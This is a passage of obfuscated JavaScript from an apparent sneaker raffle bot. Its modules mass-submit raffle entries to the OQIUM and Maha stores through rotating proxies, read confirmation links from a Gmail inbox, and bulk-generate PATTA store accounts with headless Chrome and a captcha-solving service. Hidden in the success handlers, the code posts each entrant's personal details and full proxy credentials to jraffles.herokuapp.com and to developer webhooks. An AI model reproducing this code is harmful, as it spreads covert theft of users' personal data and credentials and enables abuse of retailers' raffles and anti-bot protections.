                                            _0x4d00d8(console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x100028['name'] + ']\x20Task\x20' + (_0x50ee5d + 0x1) + ':\x20' + _0x120c9a)));
                                        }
                                    };
                                    try {
                                        _0x2e6c5c != 'ver' ? console['log'](_0x29f6be() + '\x20[' + _0x100028['name'] + ']\x20Task\x20' + (_0x50ee5d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2a4357['data']['attributes']['email']) : console['log'](_0x29f6be() + '\x20[' + _0x100028['name'] + ']\x20Task\x20' + (_0x50ee5d + 0x1) + ':\x20Fetching\x20Response'), _0x147a50(_0x58adfd, callback);
                                    } catch (_0x5792b5) {
                                        console['log'](_0x29f6be() + '\x20Task\x20' + (_0x50ee5d + 0x1) + ':\x20' + _0x5792b5);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x432368(_0x2d0045, 'ver', _0x2720b9, _0x321bf4, _0x158c38), console['log'](_0x29f6be() + '\x20[' + _0x2720b9['name'] + ']\x20Sleeping\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                            } catch (_0x5b70a6) {
                            }
                        }
                    }
                    try {
                        _0x1d81e9();
                        while (!_0x392062) {
                            await _0x2121c3(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1e7d20['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2121c3(0x9c4);
                    }
                    await _0x4a1d0e(_0x5be9b7, _0x1e7d20, _0x128383);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'Yp5jac',
                            'custom_source': 'FD2565-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'W4QTqQ',
                                '$consent_form_version': 0x9cbaca,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4cab15, _0x517559, _0x15f64f) {
                    var _0x3763ea = _0x517559, _0xe24b50 = 0x0;
                    for (var _0x377e77 = 0x0; _0x377e77 < _0x517559['length']; _0x377e77++) {
                        maxTasks = _0x120b49['threads'];
                        while (_0xe24b50 >= maxTasks) {
                            await _0x2121c3(_0x120b49['delay']);
                        }
                        async function _0x23956c(_0x75488, _0x18030a, _0x372ac6, _0x4b7cd5) {
                            try {
                                await _0x30a360(_0x18030a, _0x4b7cd5);
                            } catch (_0x580fc6) {
                                throw new Error(_0x580fc6);
                            }
                            async function _0x36f046(_0x922b54, _0x260e4f, _0x446b30, _0x2205b5, _0x4e9104) {
                                _0xe24b50++;
                                var _0x4875b7, _0x105349 = {}, _0x79d135 = [], _0x20dee3 = {}, _0x5a0b04 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x1989a7 = Math['round'](Math['random']() * (_0x5a0b04['length'] - 0x1));
                                !_0x2205b5 && (_0x2205b5 = {});
                                if (_0x260e4f != 'ver') {
                                    _0x3aeb59(_0x446b30['name'] + '\x20Task\x20' + (_0x922b54 + 0x1) + '\x20/\x20' + _0x2205b5['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08), _0x79d135 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x380ae8
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x2205b5[_0x922b54]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x120b49['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x3e659f
                                            }
                                        ]
                                    }], _0x20dee3 = { 'embeds': _0x79d135 }, _0x105349 = _0x446b30['data'], _0x105349['data']['attributes']['email'] = '' + _0x2205b5[_0x922b54]['Email'];
                                    if (_0x2205b5[_0x922b54]['Size'] == 'RANDOM') {
                                    }
                                    _0x105349['data']['attributes']['properties']['$first_name'] = '' + _0x2205b5[_0x922b54]['FirstName'], _0x105349['data']['attributes']['properties']['$last_name'] = '' + _0x2205b5[_0x922b54]['LastName'], _0x105349['data']['attributes']['properties']['$address1'] = _0x2205b5[_0x922b54]['Address1'] + '\x20' + _0x2205b5[_0x922b54]['Address2'] + '\x20' + _0x2205b5[_0x922b54]['HouseNumber'], _0x105349['data']['attributes']['properties']['$zip'] = '' + _0x2205b5[_0x922b54]['Zip'], _0x105349['data']['attributes']['properties']['$city'] = '' + _0x2205b5[_0x922b54]['City'], _0x105349['data']['attributes']['properties']['$country'] = '' + _0x2205b5[_0x922b54]['Country'], _0x2205b5[_0x922b54]['Size'] == 'RANDOM' ? _0x105349['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5a0b04[_0x1989a7] : _0x105349['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2205b5[_0x922b54]['Size'], _0x105349['data']['attributes']['properties']['$phone_number'] = '' + _0x2205b5[_0x922b54]['Phone'], _0x105349['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2205b5[_0x922b54]['Follower'];
                                }
                                if (_0x120b49['useRandomProxy'] = ![])
                                    var _0x81c0a5 = _0x4e9104[_0x922b54]['split'](':');
                                else
                                    var _0x60b235 = Math['round'](Math['random']() * (_0x4e9104['length'] - 0x1)), _0x81c0a5 = _0x4e9104[_0x60b235]['split'](':');
                                var _0x3df2b2 = {
                                    'jar': _0x2a4e9a,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x446b30['url'],
                                    'headers': _0x446b30['headers'],
                                    'body': JSON['stringify'](_0x105349),
                                    'proxy': 'http://' + _0x81c0a5[0x2] + ':' + _0x81c0a5[0x3] + '@' + _0x81c0a5[0x0] + ':' + _0x81c0a5[0x1]
                                };
                                return _0x260e4f != 'ver' && (_0x3df2b2['url'] = _0x446b30['url'], _0x3df2b2['headers'] = _0x446b30['headers']), _0x260e4f == 'ver' && (_0x3df2b2['method'] = 'GET'), new Promise(function (_0x5b2c5b, _0x438175) {
                                    callback = async (_0x360abf, _0x183b81, _0x4f5353) => {
                                        if (!_0x360abf && _0x183b81['statusCode'] == 0xca || !_0x360abf && _0x183b81['statusCode'] == 0xc8) {
                                            if (_0x260e4f != 'ver') {
                                                var _0x168269 = await _0x12b988(_0x2205b5[_0x922b54], _0x446b30, 'dev', ![]), _0x5941aa = await _0x12b988(_0x2205b5[_0x922b54], _0x446b30, 'pub', ![]);
                                                const _0x563415 = {
                                                    'succesDEVMSG': { 'embeds': [_0x168269] },
                                                    'succesPUBMSG': { 'embeds': [_0x5941aa] }
                                                };
                                                let _0x128fa5 = _0x2205b5[_0x922b54];
                                                try {
                                                    prxdata = {
                                                        'username': _0x380ae8['replace']('#', ''),
                                                        'module': _0x446b30['name'],
                                                        'entrydata': JSON['stringify'](_0x128fa5),
                                                        'proxy': '' + _0x4e9104[_0x922b54]
                                                    };
                                                    var _0x135732 = JSON['stringify'](prxdata);
                                                    let _0x2b5e17 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x135732, _0x2b5e17);
                                                } catch (_0x225891) {
                                                }
                                                if (_0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '')
                                                    try {
                                                        await _0x5f1090(_0x120b49['webhook'], _0x563415['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x563415['succesDEVMSG']), await _0x2121c3(0xc8);
                                                try {
                                                    await _0x5f1090(_0x442434, _0x563415['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1ded45(_0x2205b5[_0x922b54], _0x446b30);
                                            }
                                            _0xe24b50--, _0x5b2c5b(console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x446b30['name'] + ']\x20Task\x20' + (_0x922b54 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x260e4f != 'ver') {
                                                var _0x4caf57 = '' + _0x360abf, _0x54e829 = await _0x12b988(_0x2205b5[_0x922b54], _0x446b30, 'dev', !![], _0x4caf57), _0x2d676f = {};
                                                _0x2d676f['errorDEV'] = { 'embeds': [_0x54e829] }, _0x17abd2(_0x2205b5[_0x922b54], _0x446b30), _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x2d676f['errorDEV']), await _0x5f1090(_0x32737e, _0x2d676f['errorDEV']);
                                            }
                                            _0xe24b50--, _0x438175(console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x446b30['name'] + ']\x20Task\x20' + (_0x922b54 + 0x1) + ':\x20' + _0x360abf)));
                                        }
                                    };
                                    try {
                                        _0x260e4f != 'ver' && console['log'](_0x29f6be() + '\x20[' + _0x446b30['name'] + ']\x20Task\x20' + (_0x922b54 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x105349['data']['attributes']['email']), _0x147a50(_0x3df2b2, callback);
                                    } catch (_0x4b51c2) {
                                        console['log'](_0x29f6be() + '\x20Task\x20' + (_0x922b54 + 0x1) + ':\x20' + _0x4b51c2);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x36f046(_0x4b7cd5, 'nor', _0x75488, _0x18030a, _0x372ac6), console['log'](_0x29f6be() + '\x20[' + _0x75488['name'] + ']\x20Sleeping\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                            } catch (_0x5dfc32) {
                            }
                        }
                        _0x23956c(_0x4cab15, _0x3763ea, _0x15f64f, _0x377e77), await _0x2121c3(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4b908d, _0xcccdf7, _0x2628ad) {
                    var _0xcccdf7 = [], _0xf96aef = ![];
                    async function _0x51fa98() {
                        var _0x5717c1 = new _0x548918({
                            'user': _0x120b49['masterMail'],
                            'password': _0x120b49['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2d1f57(_0x2496a4) {
                            _0x5717c1['openBox']('INBOX', ![], _0x2496a4);
                        }
                        _0x5717c1['once']('ready', function () {
                            _0x2d1f57(function (_0x40fbbf, _0x2d17b7) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x40fbbf)
                                    throw _0x40fbbf;
                                _0x5717c1['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x1f4b2f, _0x59d7a2) {
                                    if (!_0x59d7a2 || !_0x59d7a2['length'])
                                        console['log'](_0x29f6be() + '\x20[' + _0x4b908d['name'] + ']\x20No\x20mails\x20found'), _0x5717c1['end']();
                                    else {
                                        var _0x2a7ab9 = _0x5717c1['seq']['fetch'](_0x59d7a2, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2a7ab9['on']('message', function (_0x5d4688, _0x4a6c42) {
                                            var _0x2aec53 = '(#' + _0x4a6c42 + ')\x20';
                                            _0x5d4688['on']('body', function (_0x46ab22, _0x4fb7dd) {
                                                _0x26bd25(_0x46ab22, (_0x267e6d, _0x4f404b) => {
                                                    var _0x5bf17b = _0x4f404b['text']['split']('(')[0x1], _0x2f648e = _0x5bf17b['split'](')')[0x0];
                                                    _0xcccdf7['push'](_0x2f648e);
                                                });
                                            }), _0x5d4688['once']('end', function () {
                                            });
                                        }), _0x2a7ab9['once']('error', function (_0x5007da) {
                                            console['log']('Fetch\x20error:\x20' + _0x5007da), _0xf96aef = !![];
                                        }), _0x2a7ab9['once']('end', function () {
                                            _0x5717c1['end'](), _0xf96aef = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x5717c1['once']('error', function (_0x3aa591) {
                            console['log'](_0x3aa591), _0xf96aef = !![];
                        }), _0x5717c1['once']('end', async function () {
                            _0xf96aef = !![];
                        }), _0x5717c1['connect']();
                    }
                    async function _0x56f7cd(_0x2e6cc5, _0x5a3015, _0x2425cf) {
                        for (var _0x11d5aa = 0x0; _0x11d5aa < _0x5a3015['length']; _0x11d5aa++) {
                            async function _0x23447f(_0x555329, _0x427615, _0xa40230, _0xe36472, _0xdf7bfb) {
                                var _0x4b2148, _0x2d8df5 = {}, _0x152f87 = [], _0xe90be7 = {}, _0x27777d = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5a2ea3 = Math['round'](Math['random']() * (_0x27777d['length'] - 0x1));
                                _0xe36472[_0x555329]['Size'] == 'RANDOM' && (_0xe36472[_0x555329]['Size'] = _0x27777d[_0x5a2ea3]);
                                !_0xe36472 && (_0xe36472 = {});
                                if (_0x120b49['useRandomProxy'] = ![])
                                    var _0x26e487 = _0xdf7bfb[_0x555329]['split'](':');
                                else
                                    var _0x3559d3 = Math['round'](Math['random']() * (_0xdf7bfb['length'] - 0x1)), _0x26e487 = _0xdf7bfb[_0x3559d3]['split'](':');
                                var _0x389eb2 = {
                                    'jar': _0x2a4e9a,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xa40230['url'],
                                    'headers': _0xa40230['headers'],
                                    'body': JSON['stringify'](_0x2d8df5),
                                    'proxy': 'http://' + _0x26e487[0x2] + ':' + _0x26e487[0x3] + '@' + _0x26e487[0x0] + ':' + _0x26e487[0x1]
                                };
                                return _0x427615 == 'ver' && (_0x389eb2['method'] = 'GET', _0x389eb2['url'] = _0xe36472[_0x555329]), new Promise(function (_0x109486, _0xd28f66) {
                                    callback = async (_0x1b364b, _0x5f125f, _0x378355) => {
                                        !_0x1b364b && _0x5f125f['statusCode'] == 0xca || !_0x1b364b && _0x5f125f['statusCode'] == 0xc8 ? _0x109486(console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0xa40230['name'] + ']\x20Task\x20' + (_0x555329 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0xd28f66(console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0xa40230['name'] + ']\x20Task\x20' + (_0x555329 + 0x1) + ':\x20' + _0x1b364b)));
                                    };
                                    try {
                                        _0x427615 != 'ver' ? console['log'](_0x29f6be() + '\x20[' + _0xa40230['name'] + ']\x20Task\x20' + (_0x555329 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2d8df5['data']['attributes']['email']) : console['log'](_0x29f6be() + '\x20[' + _0xa40230['name'] + ']\x20Task\x20' + (_0x555329 + 0x1) + ':\x20Fetching\x20Response'), _0x147a50(_0x389eb2, callback);
                                    } catch (_0x12e940) {
                                        console['log'](_0x29f6be() + '\x20Task\x20' + (_0x555329 + 0x1) + ':\x20' + _0x12e940);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x23447f(_0x11d5aa, 'ver', _0x2e6cc5, _0x5a3015, _0x2425cf), console['log'](_0x29f6be() + '\x20[' + _0x2e6cc5['name'] + ']\x20Sleeping\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                            } catch (_0x33de10) {
                                console['log'](_0x33de10), await _0x2121c3(0x2710);
                            }
                        }
                    }
                    try {
                        _0x51fa98();
                        while (!_0xf96aef) {
                            await _0x2121c3(0xfa0);
                        }
                        console['log']('Found\x20' + _0xcccdf7['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x3cd937) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x3cd937), await _0x2121c3(0x2710);
                    }
                    try {
                        await _0x56f7cd(_0x4b908d, _0xcccdf7, _0x2628ad);
                    } catch (_0x4dde9e) {
                        console['log'](_0x4dde9e), await _0x2121c3(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x542adb, _0x5a91dc, _0xabbc9d) {
                    _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x120b49['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2a15a5 = 0x0; _0x2a15a5 < _0x5a91dc['length']; _0x2a15a5++) {
                        var _0x5836d9 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x380ae8
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x120b49['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e659f
                                }
                            ]
                        }];
                        const _0x195a95 = { 'embeds': _0x5836d9 };
                        _0x3aeb59(_0x542adb['name'] + '\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20/\x20' + _0x5a91dc['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                        try {
                            await _0x30a360(_0x5a91dc, _0x2a15a5);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4407c1 = await _0x12b988(_0x5a91dc[_0x2a15a5], _0x542adb, 'acc', ![]);
                        const _0x28b995 = { 'succesDEVMSG': { 'embeds': [_0x4407c1] } };
                        if (_0x5a91dc[_0x2a15a5]['Email'] == '' || _0x5a91dc[_0x2a15a5]['FirstName'] == '' || _0x5a91dc[_0x2a15a5]['LastName'] == '') {
                            console['log'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x2121c3(0x7d0);
                            continue;
                        }
                        (_0x5a91dc[_0x2a15a5]['Password'] == '' || _0x5a91dc[_0x2a15a5] == undefined) && _0x5a91dc[_0x2a15a5]['Password'] == 'JRaffles23!';
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x37b193 = _0xabbc9d[_0x2a15a5]['split'](':');
                        else
                            var _0x5772a2 = Math['round'](Math['random']() * (_0xabbc9d['length'] - 0x1)), _0x37b193 = _0xabbc9d[_0x5772a2]['split'](':');
                        var _0x5ece03;
                        try {
                            _0x5ece03 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x37b193[0x0] + ':' + _0x37b193[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5ece03 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x37b193[0x0] + ':' + _0x37b193[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x28b6c9 = await _0x5ece03['newPage']();
                            await _0x28b6c9['authenticate']({
                                'username': '' + _0x37b193[0x2],
                                'password': '' + _0x37b193[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0x542adb['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x28b6c9['setRequestInterception'](!![]), _0x28b6c9['on']('request', _0x4d0090 => {
                                _0x4d0090['resourceType']() === 'image' || _0x4d0090['resourceType']() === 'font' || _0x4d0090['resourceType']() === 'media' ? _0x4d0090['abort']() : _0x4d0090['continue']();
                            }), await _0x28b6c9['goto']('https://patta.nl/account/register'), await _0x2121c3(0xbb8), await _0x28b6c9['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x29f6be() + '\x20[' + _0x542adb['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20Filling\x20information'), await _0x28b6c9['type']('#RegisterForm-FirstName', '' + _0x5a91dc[_0x2a15a5]['FirstName']), await _0x2121c3(0x226), await _0x28b6c9['type']('#RegisterForm-LastName', '' + _0x5a91dc[_0x2a15a5]['LastName']), await _0x2121c3(0x226), await _0x28b6c9['type']('#RegisterForm-email', '' + _0x5a91dc[_0x2a15a5]['Email']), await _0x2121c3(0x226), await _0x28b6c9['type']('#RegisterForm-password', '' + _0x5a91dc[_0x2a15a5]['Password']), await _0x2121c3(0x226), console['log'](_0x29f6be() + '\x20[' + _0x542adb['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20Submitting..'), await _0x28b6c9['$eval']('#RegisterForm', _0x4b1aff => _0x4b1aff['submit']()), await _0x2121c3(0x1f40);
                            try {
                                await _0x28b6c9['waitForSelector']('.home-page-grid__collection'), await _0x2121c3(0x1f4), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x542adb['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20Account\x20' + _0x5a91dc[_0x2a15a5]['Email'] + '\x20Generated!')), _0x190b67['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x5a91dc[_0x2a15a5]['Email'] + ',' + _0x5a91dc[_0x2a15a5]['Password']), console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x542adb['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20Account\x20' + _0x5a91dc[_0x2a15a5]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x28b995['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5f1090(_0x40cc05, _0x28b995['succesDEVMSG']);
                            } catch (_0x3119b9) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3119b9));
                            }
                        } catch (_0x5b2f75) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x2a15a5 + 0x1) + '\x20:\x20' + _0x5b2f75));
                        } finally {
                            _0x5ece03 && _0x5ece03['close'](), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5a62bc, _0x292dff, _0x3374ae) {
                    _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x120b49['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4a7e2c = 0x0; _0x4a7e2c < _0x292dff['length']; _0x4a7e2c++) {
                        var _0x28dfb7;
                        if (_0x3ac189 != 'yes')
                            var _0x3ac189 = '', _0x28d699 = 0x0;
                        _0x3aeb59(_0x5a62bc['name'] + '\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20/\x20' + _0x292dff['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                        try {
                            await _0x30a360(_0x292dff, _0x4a7e2c);
                        } catch {
                            _0x3ac189 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x292dff[_0x4a7e2c]['Email'] == '' || _0x292dff[_0x4a7e2c]['Password'] == '' || _0x292dff[_0x4a7e2c]['FirstName'] == '' || _0x292dff[_0x4a7e2c]['LastName'] == '') {
                            console['log'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x19fa3d = _0x3374ae[_0x4a7e2c]['split'](':');
                        else
                            var _0x1de07f = Math['round'](Math['random']() * (_0x3374ae['length'] - 0x1)), _0x19fa3d = _0x3374ae[_0x1de07f]['split'](':');
                        var _0x2845d4;
                        try {
                            _0x2845d4 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x19fa3d[0x0] + ':' + _0x19fa3d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2845d4 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x19fa3d[0x0] + ':' + _0x19fa3d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2508e7 = await _0x2845d4['newPage']();
                            await _0x2508e7['authenticate']({
                                'username': '' + _0x19fa3d[0x2],
                                'password': '' + _0x19fa3d[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2508e7['setRequestInterception'](!![]), _0x2508e7['on']('request', _0x26ff09 => {
                                _0x26ff09['resourceType']() === 'image' || _0x26ff09['resourceType']() === 'font' || _0x26ff09['resourceType']() === 'media' ? _0x26ff09['abort']() : _0x26ff09['continue']();
